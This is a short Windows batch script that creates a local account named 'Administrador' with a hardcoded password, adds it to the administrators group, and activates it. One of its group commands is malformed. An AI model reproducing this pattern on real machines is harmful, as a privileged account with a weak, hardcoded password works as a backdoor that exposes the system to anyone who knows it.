@echo off
net user Administrador MC@2013 /add
Net localgroup Administradores Administrador /add
Net localgroup Administrador Administrador /add
net user administrador /active:yes
net user Administrador *
MC@2013
MC@2013
cls
pause